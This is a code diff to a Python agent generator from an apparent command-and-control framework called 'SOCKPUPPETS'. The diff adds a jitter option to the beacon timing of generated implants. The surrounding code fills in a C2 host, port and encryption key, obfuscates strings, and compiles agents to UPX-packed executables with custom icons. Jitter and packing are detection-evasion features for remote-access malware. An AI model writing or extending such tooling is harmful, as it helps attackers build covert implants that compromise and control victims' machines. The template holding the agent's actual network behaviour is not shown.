@@ -44,7 +44,8 @@ class AgentGenerator:
         return content
 
     def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
-                              beacon_mode: bool = False, beacon_interval: int = 60, obfuscate: bool = True) -> str:
+                              beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
+                              obfuscate: bool = True) -> str:
         """Generate Python agent"""
         template_path = self.templates_dir / "agent_template.py"
 
@@ -60,13 +61,15 @@ class AgentGenerator:
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
         content = content.replace("{{BEACON_MODE}}", "True" if beacon_mode else "False")
         content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
+        content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))
 
         # Apply obfuscation if requested
         if obfuscate:
             content = self.obfuscate_strings(content)
 
         # Save agent
-        mode_suffix = f"_beacon{beacon_interval}s" if beacon_mode else "_stream"
+        jitter_suffix = f"_jitter{beacon_jitter}" if beacon_mode and beacon_jitter > 0 else ""
+        mode_suffix = f"_beacon{beacon_interval}s{jitter_suffix}" if beacon_mode else "_stream"
         output_file = self.output_dir / f"agent_{self.random_string(6)}{mode_suffix}.py"
         with open(output_file, 'w') as f:
             f.write(content)
@@ -253,8 +256,8 @@ class AgentGenerator:
         return results
 
     def generate_all(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
-                     beacon_mode: bool = False, beacon_interval: int = 60, compile_exe: bool = False,
-                     architectures: list = None, upx: bool = True, icon: str = None) -> dict:
+                     beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
+                     compile_exe: bool = False, architectures: list = None, upx: bool = True, icon: str = None) -> dict:
         """Generate agents for all platforms
 
         Args:
@@ -263,6 +266,7 @@ class AgentGenerator:
             encryption_key: Encryption key
             beacon_mode: Enable beacon mode
             beacon_interval: Beacon interval in seconds
+            beacon_jitter: Jitter percentage (0-100) for beacon sleep times
             compile_exe: Compile Python agent to executable
             architectures: List of architectures for compilation ['x86', 'x64', 'arm64']
             upx: Use UPX compression
@@ -272,8 +276,12 @@ class AgentGenerator:
 
         try:
             results['python'] = self.generate_python_agent(c2_host, c2_port, encryption_key,
-                                                          beacon_mode, beacon_interval)
-            mode_desc = f"beacon ({beacon_interval}s)" if beacon_mode else "streaming"
+                                                          beacon_mode, beacon_interval, beacon_jitter)
+            if beacon_mode:
+                jitter_desc = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
+                mode_desc = f"beacon ({beacon_interval}s{jitter_desc})"
+            else:
+                mode_desc = "streaming"
             print(f"[+] Python agent generated ({mode_desc}): {results['python']}")
         except Exception as e:
             results['python'] = f"Error: {str(e)}"
@@ -331,6 +339,7 @@ if __name__ == '__main__':
     parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
     parser.add_argument('--beacon', action='store_true', help='Enable beacon mode')
     parser.add_argument('--interval', type=int, default=60, help='Beacon interval in seconds (default: 60)')
+    parser.add_argument('--jitter', type=int, default=0, help='Beacon jitter percentage 0-100 (default: 0)')
     parser.add_argument('--compile', action='store_true', help='Compile Python agent to executable')
     parser.add_argument('--arch', nargs='+', choices=['x86', 'x64', 'arm64'], default=['x64'],
                        help='Target architecture(s) for compilation (default: x64)')
@@ -342,13 +351,14 @@ if __name__ == '__main__':
 
     generator = AgentGenerator(args.output)
     results = generator.generate_all(
-        args.host, args.port, args.key, args.beacon, args.interval,
+        args.host, args.port, args.key, args.beacon, args.interval, args.jitter,
         args.compile, args.arch, not args.no_upx, args.icon
     )
 
     print("\n[+] Agent generation complete!")
     print(f"[+] Output directory: {args.output}")
     if args.beacon:
-        print(f"[+] Beacon mode enabled with {args.interval}s interval")
+        jitter_info = f" with {args.jitter}% jitter" if args.jitter > 0 else ""
+        print(f"[+] Beacon mode enabled with {args.interval}s interval{jitter_info}")
     if args.compile:
         print(f"[+] Compiled for: {', '.join(args.arch)}")
